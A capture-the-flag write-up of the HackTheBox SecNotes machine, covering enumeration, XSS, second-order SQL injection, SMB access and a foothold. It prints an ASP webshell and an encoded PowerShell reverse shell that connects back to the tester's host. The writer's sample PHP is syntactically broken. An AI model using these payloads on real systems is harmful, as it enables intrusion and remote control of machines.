# SecNotes

## Introduction

Welcome to my another writeup! In this HackTheBox [SecNotes](https://app.hackthebox.com/machines/SecNotes) machine, you'll learn: Exploiting second-order SQL injection, privilege escalation via WSL, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: `secnotes\tyler` to `NT AUTHORITY\SYSTEM`](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/SecNotes.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|19:26:28(HKT)]
└> export RHOSTS=10.10.10.97    
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|19:27:57(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds syn-ack Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-24T11:29:09
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m00s, deviation: 4h02m29s, median: 0s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 25086/tcp): CLEAN (Timeout)
|   Check 2 (port 23767/tcp): CLEAN (Timeout)
|   Check 3 (port 53444/udp): CLEAN (Timeout)
|   Check 4 (port 17153/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2023-05-24T04:29:05-07:00
```

According to `rustscan` result, we have 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80                | Microsoft IIS httpd 10.0      |
|445               | SMB                           |
|8808              | Microsoft IIS httpd 10.0      |

### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|19:30:32(HKT)]
└> echo "$RHOSTS secnotes.htb" | sudo tee -a /etc/hosts
```

**Gobuster:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|19:31:54(HKT)]
└> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://secnotes.htb/ -t 40 
[...]
/login.php            (Status: 200) [Size: 1223]
/register.php         (Status: 200) [Size: 1569]
/home.php             (Status: 302) [Size: 0] [--> login.php]
/contact.php          (Status: 302) [Size: 0] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/auth.php             (Status: 500) [Size: 1208]
/.                    (Status: 302) [Size: 0] [--> login.php]
/db.php               (Status: 500) [Size: 1208]
/Login.php            (Status: 200) [Size: 1223]
/Register.php         (Status: 200) [Size: 1569]
/Contact.php          (Status: 302) [Size: 0] [--> login.php]
/change_pass.php      (Status: 302) [Size: 0] [--> login.php]
/DB.php               (Status: 500) [Size: 1208]
/Home.php             (Status: 302) [Size: 0] [--> login.php]
/LogOut.php           (Status: 302) [Size: 0] [--> login.php]
/Logout.php           (Status: 302) [Size: 0] [--> login.php]
```

**Nikto:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|19:27:00(HKT)]
└> nikto -h secnotes.htb
[...]
+ Server: Microsoft-IIS/10.0
+ /: Retrieved x-powered-by header: PHP/7.2.7.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ Root page / redirects to: login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .
+ /login.php: Admin login page/section found.
[...]
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524193750.png)

When we go to `/`, it'll redirect us to `/login.php` if not authenticated.

Hmm... We can try to guess the admin credentials, like `admin:admin`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524193904.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524193910.png)

Nope.

**However, I noticed the output is: "No account found with that username."**

That being said, we can **enumerate all usernames via different response**.

We can also try SQL injection to bypass the authentication:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524194114.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524194119.png)

Nope...

Uhh... Let's register an account??

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524194201.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524194218.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524194236.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524194244.png)

When we're logged in, it'll redirect us to `/home.php`.

In here, we can create new note, change password, sign out, and a contact us page.

We can also see that there's a yellow banner:

> Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)
>   
> Please contact **tyler@secnotes.htb** using the contact link below with any questions.

**Ah ha! Is the `tyler` user exist in this web application?**

**Let's test it in the `/login.php` page!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524194727.png)

Yep!! `tyler` user is indeed exist in this web application.

- Found web application user: `tyler`

**Now, since our username is being displayed on the `/home.php` page, we can register a user with Cross-Site Scripting (XSS) payload in it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195215.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195301.png)

It worked!! We found a **stored XSS vulnerability**! We can now put that aside, and see if we can chain that vulnerability into a bigger one.

How about the "New Note" page?

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195426.png)

In here, we can create a new note with the title and note:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195504.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195521.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195528.png)

**Again, it is vulnerable to stored XSS?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195655.png)

> Note: For `<textarea>` element text box, we have to escape it first. To do so, we can close that element by using `</textarea>`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195700.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524195706.png)

**Yep! Both of the title and content are vulnerable to stored XSS!**

Then, what does the "Contact Us" page do?

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524200036.png)

In here, we can send a message to `tyler@secnotes.htb`.

However, I try to do blind XSS, but no luck.

**So, the last thing in `/home.php` is "Change Password":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524200305.png)

In here, we can update our password:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524200425.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524200517.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524200521.png)

Burp Suite HTTP History:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524204738.png)

Since there's no CSRF (Cross-Site Request Forgery) token, I tried to supply a username POST parameter to change `tyler`'s password, but no dice...

In `/home.php`, we can delete our notes:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524205141.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524205155.png)

When we click the "X" button, it'll send a GET request with parameter `action` and `id`.

**However, I noticed that the `id` parameter's value is very weird to me:**
```
13"
```

> Note: `%22` in URL encoding is `"`.

Uhh... **Why does that `"` exist??** No clue.

**Hmm... There's one more thing we can test: `/register.php`**

Since we can inject our XSS payload in the username, **how about second order SQL injection**? :D

```sql
tyler'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524210017.png)

**This payload will create an account that try to bypass the authentication and login as user `tyler`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524210138.png)

**So, if we're logging in as the above payload, this PHP code should looks like this:**
```php
<?php
if (isset($_POST['username']) && (isset($_POST['password'])))
{
    # Check user exist
    sql = 'SELECT * FROM user WHERE username=' . $_POST['username'] ';'

    # Check password is correct
    sql = 'SELECT * FROM user WHERE password=' . $_POST['password'] ';'
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524210334.png)

Oh! We're user `tyler` now!!

**And there are 3 interesting notes:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524210445.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524210456.png)

The "new site" note is interesting, as it looks like a credential, and the `\\secnotes.htb\new-site` looks like a SMB share folder.

**Speaking of SMB, let's use that credentials to list out all the share folders in SMB:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:20:09(HKT)]
└> smbclient -L //$RHOSTS/ -U 'tyler%{Redacted}'

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	new-site        Disk      
```

**We can try to access those shares and see anything stands out:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:20:19(HKT)]
└> smbclient //$RHOSTS/ADMIN$ -U 'tyler%{Redacted}'
tree connect failed: NT_STATUS_ACCESS_DENIED
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:20:52(HKT)]
└> smbclient //$RHOSTS/C$ -U 'tyler%{Redacted}'    
tree connect failed: NT_STATUS_ACCESS_DENIED
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:20:56(HKT)]
└> smbclient //$RHOSTS/IPC$ -U 'tyler%{Redacted}'
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> 
```

As you can see, share `ADMIN$`, `C$`, `IPC$` are denied and nothing useful.

**How about the `new-site` share?**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:21:06(HKT)]
└> smbclient //$RHOSTS/new-site -U 'tyler%{Redacted}' 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed May 24 21:16:29 2023
  ..                                  D        0  Wed May 24 21:16:29 2023
  iisstart.htm                        A      696  Thu Jun 21 23:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 23:26:03 2018
```

Oh!! We can access it and we see `iisstart.htm` and `iisstart.png` file!

### HTTP on Port 8808

`iisstart.htm` and `iisstart.png` file is for Microsoft IIS HTTP web server.

**According to our `rustscan`'s result, port 8808 has the following output:**
```shell
8808/tcp open  http         syn-ack Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
```

From the HTTP title and server header, it's the Microsoft IIS HTTP web server.

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524212430.png)

Just a default install page in IIS.

**Since we can access the `\new-site` share, we can try to upload stuff to it:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:25:17(HKT)]
└> echo 'hello?' > hello.txt                           
smb: \> put hello.txt 
putting file hello.txt as \hello.txt (0.1 kb/s) (average 0.1 kb/s)
smb: \> dir
  .                                   D        0  Wed May 24 21:25:31 2023
  ..                                  D        0  Wed May 24 21:25:31 2023
  hello.txt                           A        7  Wed May 24 21:25:31 2023
  iisstart.htm                        A      696  Thu Jun 21 23:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 23:26:03 2018
```

We can upload files!!

**Can we access to the uploaded file?**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:25:59(HKT)]
└> curl http://secnotes.htb:8808/hello.txt
hello?
```

We can!!

## Initial Foothold

**Armed with above information, we can upload an ASP webshell to gain Remote Code Execution (RCE) and get a reverse shell!!**

**ASP webshell:**
```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function

szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)
%>
```

**Upload it:**
```shell
smb: \> dir
  .                                   D        0  Wed May 24 21:32:57 2023
  ..                                  D        0  Wed May 24 21:32:57 2023
  iisstart.htm                        A      696  Thu Jun 21 23:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 23:26:03 2018

		7736063 blocks of size 4096. 3356044 blocks available
smb: \> put webshell.asp 
putting file webshell.asp as \webshell.asp (4.6 kb/s) (average 4.6 kb/s)
smb: \> dir
  .                                   D        0  Wed May 24 21:35:00 2023
  ..                                  D        0  Wed May 24 21:35:00 2023
  iisstart.htm                        A      696  Thu Jun 21 23:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 23:26:03 2018
  webshell.asp                        A      496  Wed May 24 21:35:00 2023
```

**Access it:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:32:55(HKT)]
└> curl http://secnotes.htb:8808/webshell.asp
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>404 - File or directory not found.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>404 - File or directory not found.</h2>
  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>
 </fieldset></div>
</div>
</body>
</html>
```

Wait... What?? "404 Not Found"?? Looks like we have to upload a reverse shell?

According to [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services), we can the following test executable file extensions:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524215240.png)

**Hmm... Let's test PHP as we saw there's a web application written in PHP:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:51:20(HKT)]
└> cat revshell.php                          
<?php system("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="); ?>
```

**The reverse shell payload is generated from [revshells.com](https://www.revshells.com/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230524215530.png)

- **Setup a `nc` listener:**

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:50:07(HKT)]
└> rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
```

- **Upload the PHP revere shell:**

```shell
smb: \> put revshell.php 
putting file revshell.php as \revshell.php (12.7 kb/s) (average 4.9 kb/s)
smb: \> dir
  .                                   D        0  Wed May 24 21:51:10 2023
  ..                                  D        0  Wed May 24 21:51:10 2023
  iisstart.htm                        A      696  Thu Jun 21 23:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 23:26:03 2018
  revshell.php                        A     1367  Wed May 24 21:51:10 2023
```

- **Trigger the reverse shell:**

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:45:21(HKT)]
└> curl http://secnotes.htb:8808/revshell.php
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.24|21:50:07(HKT)]
└> rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.97] 65024

PS C:\inetpub\new-site> whoami;ipconfig
secnotes\tyler

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::10c
   IPv6 Address. . . . . . . . . . . : dead:beef::2d72:6653:c59c:8175
   Temporary IPv6 Address. . . . . . : dead:beef::61b6:9abd:22c0:a2e1
   Link-local IPv6 Address . . . . . : fe80::2d72:6653:c59c:8175%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.97
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%11
                                       10.10.10.2
PS C:\inetpub\new-site> 
```

Nice!! I'm `secnotes\tyler`!

**user.txt:**
```shell
PS C:\inetpub\new-site> cd c:\users\tyler\desktop\
PS C:\users\tyler\desktop> type user.txt
{Redacted}
```

## Privilege Escalation

### `secnotes\tyler` to `NT AUTHORITY\SYSTEM`

**systeminfo:**
```shell
PS C:\inetpub\new-site> systeminfo
PS C:\inetpub\new-site> 
```

Nothing... Maybe it's blocked by something...

**Check `tyler`'s privilege:**
```shell
PS C:\inetpub\new-site> whoami /all

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================
secnotes\tyler S-1-5-21-1791094074-1363918840-4199337083-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State  
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

**Check local users:**
```shell
PS C:\inetpub\new-site> net user

User accounts for \\SECNOTES

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
tyler                    WDAGUtilityAccount       
```

We can only see there's only 1 local user: `tyler`.

**Check listening ports:**
```shell
PS C:\inetpub\new-site> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       888
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       3084
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5368
  TCP    0.0.0.0:8808           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:33060          0.0.0.0:0              LISTENING       3084
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       504
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1088
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1384
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1724
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       644
  TCP    10.10.10.97:139        0.0.0.0:0              LISTENING       4
  TCP    10.10.10.97:49764      10.10.14.26:443        ESTABLISHED     6116
  TCP    127.0.0.1:80           127.0.0.1:49674        ESTABLISHED     4
  TCP    127.0.0.1:80           127.0.0.1:49681        ESTABLISHED     4
  TCP    127.0.0.1:49670        127.0.0.1:49671        ESTABLISHED     3084
  TCP    127.0.0.1:49671        127.0.0.1:49670        ESTABLISHED     3084
  TCP    127.0.0.1:49674        127.0.0.1:80           ESTABLISHED     2356
  TCP    127.0.0.1:49681        127.0.0.1:80           ESTABLISHED     2356
 [...]
```

TCP port 3306, 5040, 33060 didn't exist during port scanning.

Then, I enumerated scheduled tasks, weak service permissions, unquoted service paths, but nothing weird.

**Found MySQL database credentials:**
```shell
PS C:\inetpub\new-site> type C:\inetpub\wwwroot\db.php
<?php

if ($includes != 1) {
	die("ERROR: Should not access directly.");
}

/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'secnotes');
define('DB_PASSWORD', '{Redacted}');
//define('DB_USERNAME', 'root');
//define('DB_PASSWORD', '{Redacted}');
define('DB_NAME', 'secnotes');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
     
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```

**`C:\Users` directory:**
```shell
PS C:\inetpub\new-site> dir c:\users


    Directory: C:\users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        1/25/2021   7:45 AM                Administrator                                                         
d-----        6/21/2018   2:55 PM                DefaultAppPool                                                        
d-----        6/21/2018   1:23 PM                new                                                                   
d-----        6/21/2018   3:00 PM                newsite                                                               
d-r---        6/21/2018   2:12 PM                Public                                                                
d-----        8/19/2018  10:54 AM                tyler                                                                 
d-----        6/21/2018   2:55 PM                wayne                                                                 
```

- Found some weird directory: `new`, `newsite`, `wayne`.

```shell
PS C:\inetpub\new-site> dir c:\users\new
PS C:\inetpub\new-site> dir c:\users\newsite
PS C:\inetpub\new-site> dir c:\users\wayne
```

It seems like we can't access to those directories.

**In `tyler`'s home directory, we see this:**
```shell
PS C:\inetpub\new-site> dir c:\users\tyler

    Directory: C:\users\tyler


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        8/19/2018   3:51 PM                3D Objects                                                            
d-----        8/19/2018  11:10 AM                cleanup                                                               
d-r---        8/19/2018   3:51 PM                Contacts                                                              
d-r---        8/19/2018   3:51 PM                Desktop                                                               
d-r---        8/19/2018   3:51 PM                Documents                                                             
d-r---        8/19/2018   3:51 PM                Downloads                                                             
d-r---        8/19/2018   3:51 PM                Favorites                                                             
d-r---        8/19/2018   3:51 PM                Links                                                                 
d-r---        8/19/2018   3:51 PM                Music                                                                 
d-r---         4/9/2021   6:09 AM                OneDrive                                                              
d-r---        8/19/2018   3:51 PM                Pictures                                                              
d-r---        8/19/2018   3:51 PM                Saved Games                                                           
d-r---        8/19/2018   3:51 PM                Searches                                                              
d-----         4/9/2021   7:40 AM                secnotes_contacts                                                     
d-r---        8/19/2018   3:51 PM                Videos                                                                
-a----        8/19/2018  10:49 AM              0 .php_history                                                          
-a----        6/22/2018   4:29 AM              8 0                                                                     
```

**`cleanup`:**
```shell
PS C:\inetpub\new-site> dir c:\users\tyler\cleanup


    Directory: C:\users\tyler\cleanup


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        8/19/2018  11:08 AM            237 cleanup.ps1                                                           


PS C:\inetpub\new-site> type c:\users\tyler\cleanup\cleanup.ps1
while($true) {
	Write-Host "Cleaning up new-site!"
	Get-ChildItem -Path "C:\inetpub\new-site" -Exclude iisstart.* | Select -ExpandProperty FullName | Remove-Item -Force

	Write-Host "Sleeping for 5 minutes..."
	Start-Sleep -s 300
}
```

